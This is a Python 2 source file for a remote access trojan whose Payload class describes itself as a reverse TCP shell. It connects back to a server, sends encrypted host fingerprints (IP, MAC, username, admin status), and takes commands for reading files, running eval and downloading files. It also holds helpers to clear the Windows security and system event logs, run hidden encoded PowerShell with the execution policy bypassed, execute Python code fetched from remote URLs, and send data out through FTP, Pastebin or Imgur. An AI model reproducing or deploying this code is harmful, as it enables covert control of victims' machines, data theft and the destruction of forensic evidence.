import tempfile
import sys
import subprocess
import ctypes
import json
import zlib
import Cryptodome.Hash.SHA256
import urllib
import Cryptodome.Hash.HMAC
import ftplib
import colorama
import contextlib
import random
import collections
import time
import socket
import numpy
import imp
import StringIO
import urllib2
import logging
import Cryptodome.Util.number
import os
import zipfile
import threading
import base64
import uuid
import requests
import Cryptodome.Cipher.AES
import struct
import functools
import marshal

class RemoteImporter(object):
    """ 
    The class that implements the remote import API. 
    :param list modules: list of module/package names to make available for remote import
    :param str base_url: URL of directory/repository of modules being served through HTTPS

    """

    def __init__(self, modules, base_url):
        self.module_names = modules
        self.base_url = base_url + '/'
        self.non_source = False
        self.reload = False

    def find_module(self, fullname, path=None):
        log(level='debug', info= "FINDER=================")
        log(level='debug', info= "Searching: %s" % fullname)
        log(level='debug', info= "Path: %s" % path)
        log(level='info', info= "Checking if in declared remote module names...")
        if fullname.split('.')[0] not in self.module_names + list(set([_.split('.')[0] for _ in self.module_names])):
            log(level='info', info= "[-] Not found!")
            return None
        log(level='info', info= "Checking if built-in....")
        try:
            loader = imp.find_module(fullname, path)
            if loader:
                log(level='info', info= "[-] Found locally!")
                return None
        except ImportError:
            pass
        log(level='info', info= "Checking if it is name repetition... ")
        if fullname.split('.').count(fullname.split('.')[-1]) > 1:
            log(level='info', info= "[-] Found locally!")
            return None
        log(level='info', info= "[+] Module/Package '%s' can be loaded!" % fullname)
        return self


    def load_module(self, name):
        imp.acquire_lock()
        log(level='debug', info= "LOADER=================")
        log(level='debug', info= "Loading %s..." % name)
        if name in sys.modules and not self.reload:
            log(level='info', info= '[+] Module "%s" already loaded!' % name)
            imp.release_lock()
            return sys.modules[name]
        if name.split('.')[-1] in sys.modules and not self.reload:
            log(level='info', info= '[+] Module "%s" loaded as a top level module!' % name)
            imp.release_lock()
            return sys.modules[name.split('.')[-1]]
        module_url = self.base_url + '%s.py' % name.replace('.', '/')
        package_url = self.base_url + '%s/__init__.py' % name.replace('.', '/')
        zip_url = self.base_url + '%s.zip' % name.replace('.', '/')
        final_url = None
        final_src = None
        try:
            log(level='debug', info= "Trying to import '%s' as package from: '%s'" % (name, package_url))
            package_src = None
            if self.non_source:
                package_src = self.__fetch_compiled(package_url)
            if package_src == None:
                package_src = urllib2.urlopen(package_url).read()
            final_src = package_src
            final_url = package_url
        except IOError as e:
            package_src = None
            log(level='info', info= "[-] '%s' is not a package (%s)" % (name, str(e)))
        if final_src == None:
            try:
                log(level='debug', info= "[+] Trying to import '%s' as module from: '%s'" % (name, module_url))
                module_src = None
                if self.non_source:
                    module_src = self.__fetch_compiled(module_url)
                if module_src == None:
                    module_src = urllib2.urlopen(module_url).read()
                final_src = module_src
                final_url = module_url
            except IOError as e:
                module_src = None
                log(level='info', info= "[-] '%s' is not a module (%s)" % (name, str(e)))
                imp.release_lock()
                return None
        log(level='debug', info= "[+] Importing '%s'" % name)
        mod = imp.new_module(name)
        mod.__loader__ = self
        mod.__file__ = final_url
        if not package_src:
            mod.__package__ = name
        else:
            mod.__package__ = name.split('.')[0]
        mod.__path__ = ['/'.join(mod.__file__.split('/')[:-1]) + '/']
        log(level='debug', info= "[+] Ready to execute '%s' code" % name)
        sys.modules[name] = mod
        exec(final_src, mod.__dict__)
        log(level='info', info= "[+] '%s' imported succesfully!" % name)
        imp.release_lock()
        return mod

    def __fetch_compiled(self, url):
        import marshal
        module_src = None
        try:
            module_compiled = urllib2.urlopen(url + 'c').read()
            try:
                module_src = marshal.loads(module_compiled[8:])
                return module_src
            except ValueError:
                pass
            try:
                module_src = marshal.loads(module_compiled[12:])# Strip the .pyc file header of Python 3.3 and onwards (changed .pyc spec)
                return module_src
            except ValueError:
                pass
        except IOError as e:
            log(level='debug', info= "[-] No compiled version ('.pyc') for '%s' module found!" % url.split('/')[-1])
        return module_src

def __create_github_url(username, repo, branch='master'):
    github_raw_url = 'https://raw.githubusercontent.com/{user}/{repo}/{branch}/'
    return github_raw_url.format(user=username, repo=repo, branch=branch)

def _add_git_repo(url_builder, username=None, repo=None, module=None, branch=None, commit=None):
    if username == None or repo == None:
        raise Exception("'username' and 'repo' parameters cannot be None")
    if commit and branch:
        raise Exception("'branch' and 'commit' parameters cannot be both set!")
    if commit:
        branch = commit
    if not branch:
        branch = 'master'
    if not module:
        module = repo
    if type(module) == str:
        module = [module]
    url = url_builder(username, repo, branch)
    return add_remote_repo(module, url)

def add_remote_repo(modules, base_url='http://localhost:8000/'):
    """ 
    Function that creates and adds to the 'sys.meta_path' an RemoteImporter object.
    The parameters are the same as the RemoteImporter class contructor.
    """
    importer = RemoteImporter(modules, base_url)
    sys.meta_path.insert(0, importer)
    return importer

def remove_remote_repo(base_url):
    """ 
    Function that removes from the 'sys.meta_path' an RemoteImporter object given its HTTP/S URL.
    """
    for importer in sys.meta_path:
        try:
            if importer.base_url.startswith(base_url):  # an extra '/' is always added
                sys.meta_path.remove(importer)
                return True
        except AttributeError as e: pass
    return False

@contextlib.contextmanager
def remote_repo(modules, base_url='http://localhost:8000/'):
    """ 
    Context Manager that provides remote import functionality through a URL.
    The parameters are the same as the RemoteImporter class contructor.
    """
    importer = add_remote_repo(modules, base_url)
    yield
    remove_remote_repo(base_url)

@contextlib.contextmanager
def github_repo(username=None, repo=None, module=None, branch=None, commit=None):
    """ 
    Context Manager that provides import functionality from Github repositories through HTTPS.
    The parameters are the same as the '_add_git_repo' function. No 'url_builder' function is needed.
    """
    importer = _add_git_repo(__create_github_url,
        username, repo, module=module, branch=branch, commit=commit)
    yield
    remove_remote_repo(importer.base_url)


def log(info, level='debug'):
    """ 
    Log output to the console (if verbose output is enabled)

    """
    import logging
    logging.basicConfig(level=logging.DEBUG if globals()['_debug'] else logging.ERROR, handler=logging.StreamHandler())
    logger = logging.getLogger(__name__)
    getattr(logger, level if hasattr(logger, level) else 'debug')(str(info))

def imports(source, target=None):
    """ 
    Attempt to import each package into the module specified

    `Required`
    :param list source: package/module to import

    `Optional`
    :param object target: target object/module to import into 

    """
    if isinstance(source, str):
        source = source.split()
    if isinstance(target, dict):
        module = target
    elif hasattr(target, '__dict__'):
        module = target.__dict__
    else:
        module = globals()
    for src in source:
        try:
            exec "import {}".format(src) in target
        except ImportError:
            log("missing package '{}' is required".format(source))

def is_compatible(platforms=['win32','linux2','darwin'], module=None):
    """ 
    Verify that a module is compatible with the host platform

    `Optional`
    :param list platforms:   compatible platforms
    :param str module:       name of the module

    """
    import sys
    if sys.platform in platforms:
        return True
    log("module {} is not yet compatible with {} platforms".format(module if module else '', sys.platform), level='warn')
    return False

def platform():
    """ 
    Return the system platform of host machine

    """
    import sys
    return sys.platform

def public_ip():
    """ 
    Return public IP address of host machine

    """
    import urllib
    return urllib.urlopen('http://api.ipify.org').read()

def local_ip():
    """ 
    Return local IP address of host machine

    """
    import socket
    return socket.gethostbyname(socket.gethostname())

def mac_address():
    """ 
    Return MAC address of host machine

    """
    import uuid
    return ':'.join(hex(uuid.getnode()).strip('0x').strip('L')[i:i+2] for i in range(0,11,2)).upper()

def architecture():
    """ 
    Check if host machine has 32-bit or 64-bit processor architecture

    """
    import struct
    return int(struct.calcsize('P') * 8)

def device():
    """ 
    Return the name of the host machine

    """
    import socket
    return socket.getfqdn(socket.gethostname())

def username():
    """ 
    Return username of current logged in user

    """
    import os
    return os.getenv('USER', os.getenv('USERNAME', 'user'))

def administrator():
    """ 
    Return True if current user is administrator, otherwise False

    """
    import os
    import ctypes
    return bool(ctypes.windll.shell32.IsUserAnAdmin() if os.name == 'nt' else os.getuid() == 0)

def ipv4(address):
    """ 
    Check if valid IPv4 address

    `Required`
    :param str address:   string to check

    Returns True if input is valid IPv4 address, otherwise False

    """
    import socket
    try:
        if socket.inet_aton(str(address)):
           return True
    except:
        return False

def status(timestamp):
    """ 
    Check the status of a job/thread

    `Required`
    :param float timestamp:   Unix timestamp (seconds since the Epoch)

    """
    import time
    c = time.time() - float(timestamp)
    data=['{} days'.format(int(c / 86400.0)) if int(c / 86400.0) else str(),
          '{} hours'.format(int((c % 86400.0) / 3600.0)) if int((c % 86400.0) / 3600.0) else str(),
          '{} minutes'.format(int((c % 3600.0) / 60.0)) if int((c % 3600.0) / 60.0) else str(),
          '{} seconds'.format(int(c % 60.0)) if int(c % 60.0) else str()]
    return ', '.join([i for i in data if i])

def post(url, headers={}, data={}, json={}, as_json=False):
    """ 
    Make a HTTP post request and return response

    `Required`
    :param str url:       URL of target web page

    `Optional`
    :param dict headers:  HTTP request headers
    :param dict data:     HTTP request POST data
    :param dict json:     POST data in JSON format
    :param bool as_json:  return JSON formatted output

    """
    try:
        import requests
        req = requests.post(url, headers=headers, data=data, json=json)
        output = req.content
        if as_json:
            try:
                output = req.json()
            except: pass
        return output
    except ImportError:
        import urllib
        import urllib2
        data = urllib.urlencode(data)
        req  = urllib2.Request(str(url), data=data)
        for key, value in headers.items():
            req.headers[key] = value
        output = urllib2.urlopen(req).read()
        if as_json:
            import json
            try:
                output = json.loads(output)
            except: pass
        return output
    
def normalize(source):
    """ 
    Normalize data/text/stream

    `Required`
    :param source:   string OR readable-file

    """
    import os
    if os.path.isfile(source):
        return open(source, 'rb').read()
    elif hasattr(source, 'getvalue'):
        return source.getvalue()
    elif hasattr(source, 'read'):
        if hasattr(source, 'seek'):
            source.seek(0)
        return source.read()
    else:
        return bytes(source)

def registry_key(key, subkey, value):
    """ 
    Create a new Windows Registry Key in HKEY_CURRENT_USER

    `Required`
    :param str key:         primary registry key name
    :param str subkey:      registry key sub-key name
    :param str value:       registry key sub-key value

    Returns True if successful, otherwise False

    """
    try:
        import _winreg
        reg_key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, key, 0, _winreg.KEY_WRITE)
        _winreg.SetValueEx(reg_key, subkey, 0, _winreg.REG_SZ, value)
        _winreg.CloseKey(reg_key)
        return True
    except Exception as e:
        log(e)
        return False

def png(image):
    """ 
    Transforms raw image data into a valid PNG data

    `Required`
    :param image:   `numpy.darray` object OR `PIL.Image` object

    Returns raw image data in PNG format

    """
    import zlib
    import numpy
    import struct
    import StringIO
    if isinstance(image, numpy.ndarray):
        width, height = (image.shape[1], image.shape[0])
        data = image.tobytes()
    elif hasattr(image, 'width') and hasattr(image, 'height') and hasattr(image, 'rgb'):
        width, height = (image.width, image.height)
        data = image.rgb
    else:
        raise TypeError("invalid input type: {}".format(type(image)))
    line = width * 3
    png_filter = struct.pack('>B', 0)
    scanlines = b"".join([png_filter + data[y * line:y * line + line] for y in range(height)])
    magic = struct.pack('>8B', 137, 80, 78, 71, 13, 10, 26, 10)
    ihdr = [b"", b'IHDR', b"", b""]
    ihdr[2] = struct.pack('>2I5B', width, height, 8, 2, 0, 0, 0)
    ihdr[3] = struct.pack('>I', zlib.crc32(b"".join(ihdr[1:3])) & 0xffffffff)
    ihdr[0] = struct.pack('>I', len(ihdr[2]))
    idat = [b"", b'IDAT', zlib.compress(scanlines), b""]
    idat[3] = struct.pack('>I', zlib.crc32(b"".join(idat[1:3])) & 0xffffffff)
    idat[0] = struct.pack('>I', len(idat[2]))
    iend = [b"", b'IEND', b"", b""]
    iend[3] = struct.pack('>I', zlib.crc32(iend[1]) & 0xffffffff)
    iend[0] = struct.pack('>I', len(iend[2]))
    fileh = StringIO.StringIO()
    fileh.write(magic)
    fileh.write(b"".join(ihdr))
    fileh.write(b"".join(idat))
    fileh.write(b"".join(iend))
    fileh.seek(0)
    return fileh.getvalue()

def delete(target):
    """ 
    Tries to delete file via multiple methods, if necessary

    `Required`
    :param str target:     target filename to delete

    """
    import os
    try:
        _ = os.popen('attrib -h -r -s {}'.format(target)) if os.name == 'nt' else os.chmod(target, 777)
    except OSError: pass
    try:
        if os.path.isfile(target):
            os.remove(target)
        elif os.path.isdir(target):
            import shutil
            shutil.rmtree(target, ignore_errors=True)
    except OSError: pass

def clear_system_logs():
    """ 
    Clear Windows system logs (Application, security, Setup, System)

    """
    try:
        for log in ["application","security","setup","system"]:
            output = powershell_exec("& { [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog(\"%s\")}" % log)
            if output:
                log(output)
    except Exception as e:
        log(e)

def kwargs(data):
    """ 
    Takes a string as input and returns a dictionary of keyword arguments

    `Required`
    :param str data:    string to parse for keyword arguments

    Returns dictionary of keyword arguments as key-value pairs

    """
    try:
        return {i.partition('=')[0]: i.partition('=')[2] for i in str(data).split() if '=' in i}
    except Exception as e:
        log(e)

def powershell(code):
    """ 
    Execute code in Powershell.exe and return any results

    `Required`
    :param str code:      script block of Powershell code

    Returns any output from Powershell executing the code

    """
    import os
    import base64
    try:
        powershell = r'C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe' if os.path.exists(r'C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe') else os.popen('where powershell').read().rstrip()
        return os.popen('{} -exec bypass -window hidden -noni -nop -encoded {}'.format(powershell, base64.b64encode(code))).read()
    except Exception as e:
        log("{} error: {}".format(powershell.func_name, str(e)))

def display(output, color=None, style=None, end='\n', event=None, lock=None):
    """ 
    Display output in the console

    `Required`
    :param str output:    text to display

    `Optional`
    :param str color:     red, green, cyan, magenta, blue, white
    :param str style:     normal, bright, dim
    :param str end:       __future__.print_function keyword arg                                                       
    :param lock:          threading.Lock object
    :param event:         threading.Event object
 
    """
    import colorama
    colorama.init()
    output = str(output)
    _color = ''
    if color:
        _color = getattr(colorama.Fore, color.upper())
    _style = ''
    if style:
        _style = getattr(colorama.Style, style.upper())
    exec("print(_color + _style + output){}".format(end))

def color():
    """ 
    Returns a random color for use in console display

    """
    try:
        import random
        return random.choice(['BLACK', 'BLUE', 'CYAN', 'GREEN', 'LIGHTBLACK_EX', 'LIGHTBLUE_EX', 'LIGHTCYAN_EX', 'LIGHTGREEN_EX', 'LIGHTMAGENTA_EX', 'LIGHTRED_EX', 'LIGHTWHITE_EX', 'LIGHTYELLOW_EX', 'MAGENTA', 'RED', 'RESET', 'WHITE', 'YELLOW'])
    except Exception as e:
        log("{} error: {}".format(color.func_name, str(e)))

def imgur(source, api_key=None):
    """ 
    Upload image file/data to Imgur 

    """
    import base64
    if api_key:
        post = post('https://api.imgur.com/3/upload', headers={'Authorization': 'Client-ID {}'.format(api_key)}, data={'image': base64.b64encode(normalize(data)), 'type': 'base64'}, as_json=True)
        return post['data']['link'].encode()
    else:
        log("No Imgur API key found")

def pastebin(source, api_key):
    """ 
    Upload file/data to Pastebin

    `Required`
    :param str source:         data or readable file-like object
    :param str api_dev_key:    Pastebin api_dev_key

    `Optional`
    :param str api_user_key:   Pastebin api_user_key

    """
    import urllib2
    if isinstance(api_key, str):
        try:
            info = {'api_option': 'paste', 'api_paste_code': normalize(source), 'api_dev_key': api_key}
            paste = post('https://pastebin.com/api/api_post.php', data=info)
            parts = urllib2.urlparse.urlsplit(paste)       
            return urllib2.urlparse.urlunsplit((parts.scheme, parts.netloc, '/raw' + parts.path, parts.query, parts.fragment)) if paste.startswith('http') else paste
        except Exception as e:
            log("Upload to Pastebin failed with error: {}".format(e))
    else:
        log("No Pastebin API key found")

def ftp(source, host=None, user=None, password=None, filetype=None):
    """ 
    Upload file/data to FTP server

    `Required`
    :param str source:    data or readable file-like object
    :param str host:      FTP server hostname
    :param str user:      FTP account username
    :param str password:  FTP account password

    `Optional`
    :param str filetype:  target file type (default: .txt)

    """
    import os
    import time
    import ftplib
    import StringIO
    if host and user and password:
        path  = ''
        local = time.ctime().split()
        if os.path.isfile(str(source)):
            path   = source
            source = open(path, 'rb')
        elif hasattr(source, 'seek'):
            source.seek(0)
        else:
            source = StringIO.StringIO(source)
        try:
            ftp = ftplib.FTP(host=host, user=user, password=password)
        except:
            return "Upload failed - remote FTP server authorization error"
        addr = public_ip()
        if 'tmp' not in ftp.nlst():
            ftp.mkd('/tmp')
        if addr not in ftp.nlst('/tmp'):
            ftp.mkd('/tmp/{}'.format(addr))
        if path:
            path = '/tmp/{}/{}'.format(addr, os.path.basename(path))
        else:
            filetype = '.' + str(filetype) if not str(filetype).startswith('.') else str(filetype)
            path = '/tmp/{}/{}'.format(addr, '{}-{}_{}{}'.format(local[1], local[2], local[3], filetype))
        stor = ftp.storbinary('STOR ' + path, source)
        return path
    else:
        log('missing one or more required arguments: host, user, password')

def config(*arg, **options):
    """ 
    Configuration decorator for adding attributes (e.g. declare platforms attribute with list of compatible platforms)

    """
    import functools
    def _config(function):
        @functools.wraps(function)
        def wrapper(*args, **kwargs):
            return function(*args, **kwargs)
        for k,v in options.items():
            setattr(wrapper, k, v)
        return wrapper
    return _config

def threaded(function):
    """ 
    Decorator for making a function threaded

    `Required`
    :param function:    function/method to run in a thread

    """
    import time
    import threading
    import functools
    @functools.wraps(function)
    def _threaded(*args, **kwargs):
        t = threading.Thread(target=function, args=args, kwargs=kwargs, name=time.time())
        t.daemon = True
        t.start()
        return t
    return _threaded
  


def diffiehellman(connection):
    """ 
    Diffie-Hellman Internet Key Exchange (RFC 2741)

    `Requires`
    :param socket connection:     socket.socket object

    Returns the 256-bit binary digest of the SHA256 hash
    of the shared session encryption key
    """
    if isinstance(connection, socket.socket):
        g  = 2
        p  = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AACAA68FFFFFFFFFFFFFFFF
        a  = Cryptodome.Util.number.bytes_to_long(os.urandom(32))
        xA = pow(g, a, p)
        connection.send(Cryptodome.Util.number.long_to_bytes(xA))
        xB = Cryptodome.Util.number.bytes_to_long(connection.recv(256))
        x  = pow(xB, a, p)
        return Cryptodome.Hash.SHA256.new(Cryptodome.Util.number.long_to_bytes(x)).digest()
    else:
        raise TypeError("argument 'connection' must be type '{}'".format(socket.socket))

def encrypt_aes(plaintext, key, padding=chr(0)):
    """ 
    AES-256-OCB encryption

    `Requires`
    :param str plaintext:   plain text/data
    :param str key:         session encryption key 

    `Optional`
    :param str padding:     default: (null byte)
    
    Returns encrypted ciphertext as base64-encoded string

    """
    cipher = Cryptodome.Cipher.AES.new(key, Cryptodome.Cipher.AES.MODE_OCB)
    ciphertext, tag = cipher.encrypt_and_digest(plaintext)
    output = b''.join((cipher.nonce, tag, ciphertext))
    return base64.b64encode(output)

def decrypt_aes(ciphertext, key, padding=chr(0)):
    """ 
    AES-256-OCB decryption

    `Requires`
    :param str ciphertext:  encrypted block of data
    :param str key:         session encryption key 

    `Optional`
    :param str padding:     default: (null byte)

    Returns decrypted plaintext as string
    
    """
    data = StringIO.StringIO(base64.b64decode(ciphertext))
    nonce, tag, ciphertext = [ data.read(x) for x in (Cryptodome.Cipher.AES.block_size - 1, Cryptodome.Cipher.AES.block_size, -1) ]
    cipher = Cryptodome.Cipher.AES.new(key, Cryptodome.Cipher.AES.MODE_OCB, nonce)
    return cipher.decrypt_and_verify(ciphertext, tag)

def encrypt_xor(data, key, block_size=8, key_size=16, num_rounds=32, padding=chr(0)):
    """ 
    XOR-128 encryption

    `Required`
    :param str data:        plaintext
    :param str key:         256-bit key

    `Optional`
    :param int block_size:  block size
    :param int key_size:    key size
    :param int num_rounds:  number of rounds
    :param str padding:     padding character

    Returns encrypted ciphertext as base64-encoded string

    """
    data    = bytes(data) + (int(block_size) - len(bytes(data)) % int(block_size)) * bytes(padding)
    blocks  = [data[i * block_size:((i + 1) * block_size)] for i in range(len(data) // block_size)]
    vector  = os.urandom(8)
    result  = [vector]
    for block in blocks:
        block   = bytes().join(chr(ord(x) ^ ord(y)) for x, y in zip(vector, block))
        v0, v1  = struct.unpack("!2L", block)
        k       = struct.unpack("!4L", key[:key_size])
        sum, delta, mask = 0L, 0x9e3779b9L, 0xffffffffL
        for round in range(num_rounds):
            v0  = (v0 + (((v1 << 4 ^ v1 >> 5) + v1) ^ (sum + k[sum & 3]))) & mask
            sum = (sum + delta) & mask
            v1  = (v1 + (((v0 << 4 ^ v0 >> 5) + v0) ^ (sum + k[sum >> 11 & 3]))) & mask
        output  = vector = struct.pack("!2L", v0, v1)
        result.append(output)
    return base64.b64encode(bytes().join(result))

def decrypt_xor(data, key, block_size=8, key_size=16, num_rounds=32, padding=chr(0)):
    """ 
    XOR-128 encryption

    `Required`
    :param str data:        ciphertext
    :param str key:         256-bit key

    `Optional`
    :param int block_size:  block size
    :param int key_size:    key size
    :param int num_rounds:  number of rounds
    :param str padding:     padding character

    Returns decrypted plaintext as string

    """
    data    = base64.b64decode(data)
    blocks  = [data[i * block_size:((i + 1) * block_size)] for i in range(len(data) // block_size)]
    vector  = blocks[0]
    result  = []
    for block in blocks[1:]:
        v0, v1  = struct.unpack("!2L", block)
        k0     = struct.unpack("!4L", key[:key_size])
        delta, mask = 0x9e3779b9L, 0xffffffffL
        sum     = (delta * num_rounds) & mask
        for round in range(num_rounds):
            v1  = (v1 - (((v0 << 4 ^ v0 >> 5) + v0) ^ (sum + k0[sum >> 11 & 3]))) & mask
            sum = (sum - delta) & mask
            v0  = (v0 - (((v1 << 4 ^ v1 >> 5) + v1) ^ (sum + k0[sum & 3]))) & mask
        decode  = struct.pack("!2L", v0, v1)
        output  = str().join(chr(ord(x) ^ ord(y)) for x, y in zip(vector, decode))
        vector  = block
        result.append(output)
    return str().join(result).rstrip(padding)



_abort = False
_debug = '--debug' in sys.argv

class Payload():
    """ 
    Reverse TCP shell designed to provide remote access
    to the host's terminal, enabling direct control of the
    device from a remote server.

    """

    def __init__(self, host='127.0.0.1', port=1337, **kwargs):
        """ 
        Create a reverse TCP shell instance

        `Required`
        :param str host:          server IP address
        :param int port:          server port number

        """
        self.handlers = {}
        self.remote = {'modules': [], 'packages': []}
        self.flags = self._get_flags()
        self.connection = self._get_connection(host, port)
        self.key = self._get_key(self.connection)
        self.info = self._get_info()

    def _get_flags(self):
        return collections.namedtuple('flag', ('connection','passive','prompt'))(threading.Event(), threading.Event(), threading.Event())

    def _get_command(self, cmd):
        if bool(hasattr(self, cmd) and hasattr(getattr(self, cmd), 'command') and getattr(getattr(self, cmd),'command')):
            return getattr(self, cmd)
        return False

    def _get_connection(self, host, port):
        while True:
            try:
                connection = socket.create_connection((host, port))
                break
            except (socket.error, socket.timeout):
                log("Unable to connect to server. Retrying in 30 seconds...")
                time.sleep(30)
                continue
            except Exception as e:
                log("{} error: {}".format(self._get_connection.func_name, str(e)))
                sys.exit()
        self.flags.connection.set()
        return connection

    def _get_key(self, connection):
        if isinstance(connection, socket.socket):
            if 'diffiehellman' in globals() and callable(globals()['diffiehellman']):
                return globals()['diffiehellman'](connection)
            else:
                raise Exception("unable to complete session key exchange: missing required function 'diffiehellman'")
        else:
            raise TypeError("invalid object type for argument 'connection' (expected {}, received {})".format(socket.socket, type(connection)))

    def _get_info(self):
        info = {}
        for function in ['public_ip', 'local_ip', 'platform', 'mac_address', 'architecture', 'username', 'administrator', 'device']:
            try:
                info[function] = globals()[function]()
            except Exception as e:
                log(level='info', info= "'{}' from session info returned error: {}".format(function, str(e)))
        data = globals()['encrypt_aes'](json.dumps(info), self.key)
        msg = struct.pack('!L', len(data)) + data
        self.connection.sendall(msg)
        return info

    def _get_resources(self, target=None, base_url=None):
        try:
            if not isinstance(target, list):
                raise TypeError("keyword argument 'target' must be type '{}'".format(list))
            if not isinstance(base_url, str):
                raise TypeError("keyword argument 'base_url' must be type '{}'".format(str))
            if not base_url.startswith('http'):
                raise ValueError("keyword argument 'base_url' must start with http:// or https://")
            log(level='info', info= '[*] Searching %s' % base_url)
            path = urllib2.urlparse.urlsplit(base_url).path
            base = path.strip('/').replace('/','.')
            names = [line.rpartition('</a>')[0].rpartition('>')[2].strip('/') for line in urllib2.urlopen(base_url).read().splitlines() if 'href' in line if '</a>' in line if '__init__.py' not in line]
            for n in names:
                name, ext = os.path.splitext(n)
                if ext in ('.py','.pyc'):
                    module = '.'.join((base, name)) if base else name
                    if module not in target:
                        log(level='info', info= "[+] Adding %s" % module)
                        target.append(module)
                elif not len(ext):
                    t = threading.Thread(target=self._get_resources, kwargs={'target': target, 'base_url': '/'.join((base_url, n))})
                    t.daemon = True
                    t.start()
                else:
                    resource = '/'.join((path, n))
                    if resource not in target:
                        target.append(resource)
        except Exception as e:
            log("{} error: {}".format(self._get_resources.func_name, str(e)))

    @threaded
    def _get_resource_handler(self):
        try:
            host, port = self.connection.getpeername()
            self._get_resources(target=self.remote['modules'], base_url='http://{}:{}'.format(host, port + 1))
            self._get_resources(target=self.remote['packages'], base_url='http://{}:{}'.format(host, port + 2))
            print(json.dumps(self.remote, indent=2))
        except Exception as e:
            log(str(e))

    @threaded
    def _get_prompt_handler(self):
        self.send_task({"session": self.info.get('uid'), "task": "prompt", "result": "[ %d @ {} ]> ".format(os.getcwd())})
        while True:
            try:
                self.flags.prompt.wait()
                self.send_task({"session": self.info.get('uid'), "task": "prompt", "result": "[ %d @ {} ]> ".format(os.getcwd())})
                self.flags.prompt.clear()
                if globals()['_abort']:
                    break
            except Exception as e:
                log(str(e))
                break

    @threaded
    def _get_thread_handler(self):
        while True:
            jobs = self.handlers.items()
            for task, worker in jobs:
                if not worker.is_alive():
                    dead = self.handlers.pop(task, None)
                    del dead
            if globals()['_abort']:
                break
            time.sleep(0.5)

    @config(platforms=['win32','linux2','darwin'], command=True, usage='cd <path>')
    def cd(self, path='.'):
        """ 
        Change current working directory

        `Optional`
        :param str path:  target directory (default: current directory)

        """
        if os.path.isdir(path):
            return os.chdir(path)
        else:
            return os.chdir('.')

    @config(platforms=['win32','linux2','darwin'], command=True, usage='ls <path>')
    def ls(self, path='.'):
        """ 
        List the contents of a directory

        `Optional`
        :param str path:  target directory

        """
        output = []
        if os.path.isdir(path):
            for line in os.listdir(path):
                if len('\n'.join(output + [line])) < 2048:
                    output.append(line)
                else:
                    break
            return '\n'.join(output)
        else:
            return "Error: path not found"

    @config(platforms=['win32','linux2','darwin'], command=True, usage='cat <path>')
    def cat(self, path):
        """ 
        Display file contents

        `Required`
        :param str path:  target filename

        """
        output = []
        if not os.path.isfile(path):
            return "Error: file not found"
        for line in open(path, 'rb').read().splitlines():
            if len(line) and not line.isspace():
                if len('\n'.join(output + [line])) < 48000:
                    output.append(line)
                else:
                    break
        return '\n'.join(output)

    @config(platfoms=['win32','linux2','darwin'], command=False)
    def ftp(self, source, filetype=None, host=None, user=None, password=None):
        """ 
        Upload file/data to FTP server

        `Required`
        :param str source:    data or filename to upload

        `Optional`
        :param str filetype:  upload file type
        :param str host:      FTP server hostname
        :param str user:      FTP server login user
        :param str password:  FTP server login password

        """
        try:
            for attr in ('host', 'user', 'password'):
                if not locals().get(attr):
                    raise Exception("missing credential '{}' is required for FTP uploads".format(attr))
            path  = ''
            local = time.ctime().split()
            if os.path.isfile(str(source)):
                path   = source
                source = open(str(path), 'rb')
            elif hasattr(source, 'seek'):
                source.seek(0)
            else:
                source = StringIO.StringIO(bytes(source))
            host = ftplib.FTP(host=host, user=user, password=password)
            addr = urllib2.urlopen('http://api.ipify.org').read()
            if 'tmp' not in host.nlst():
                host.mkd('/tmp')
            if addr not in host.nlst('/tmp'):
                host.mkd('/tmp/{}'.format(addr))
            if path:
                path = '/tmp/{}/{}'.format(addr, os.path.basename(path))
            else:
                if filetype:
                    filetype = '.' + str(filetype) if not str(filetype).startswith('.') else str(filetype)
                    path = '/tmp/{}/{}'.format(addr, '{}-{}_{}{}'.format(local[1], local[2], local[3], filetype))
                else:
                    path = '/tmp/{}/{}'.format(addr, '{}-{}_{}'.format(local[1], local[2], local[3]))
            stor = host.storbinary('STOR ' + path, source)
            return path
        except Exception as e:
            return "{} error: {}".format(self.ftp.func_name, str(e))

    @config(platforms=['win32','linux2','darwin'], command=True, usage='pwd')
    def pwd(self, *args):
        """ 
        Show name of present working directory

        """
        return os.getcwd()

    @config(platforms=['win32','linux2','darwin'], command=True, usage='eval <code>')
    def eval(self, code):
        """ 
        Execute Python code in current context

        `Required`
        :param str code:        string of Python code to execute

        """
        try:
            return eval(code)
        except Exception as e:
            return "{} error: {}".format(self.eval.func_name, str(e))

    @config(platforms=['win32','linux2','darwin'], command=True, usage='wget <url>')
    def wget(self, url, filename=None):
        """ 
        Download file from url as temporary file and return filepath

        `Required`
        :param str url:         target URL to download ('http://...')

        `Optional`
        :param str filename:    name of the file to save the file as

        """
        if url.startswith('http'):
            try:
                path, _ = urllib.urlretrieve(url, filename) if filename else urllib.urlretrieve(url)
                return path
            except Exception as e:
                log("{} error: {}".format(self.wget.func_name, str(e)))
        else:
            return "Invalid target URL - must begin with 'http'"

    @config(platforms=['win32','linux2','darwin'], command=True, usage='kill')
    def kill(self):
        """ 
        Shutdown the current connection and reset session

        """
        try:
            self.flags.connection.clear()
            self.flags.prompt.clear()
            self.connection.close()
            for thread in self.handlers:
                try:
                    self.stop(thread)
                except Exception as e:
                    log("{} error: {}".format(self.kill.func_name, str(e)))
        except Exception as e:
            log("{} error: {}".format(self.kill.func_name, str(e)))

    @config(platforms=['win32','linux2','darwin'], command=True, usage='help [cmd]')
    def help(self, name=None):
        """ 
        Show usage help for commands and modules

        `Optional`
        :param str command:      name of a command or module

        """
        if not name:
            try:
                return {getattr(self, cmd).usage: getattr(self, cmd).func_doc for cmd in vars(self) if hasattr(getattr(self, cmd), 'command') if getattr(getattr(self, cmd), 'command')}
            except Exception as e:
                log("{} error: {}".format(self.help.func_name, str(e)))
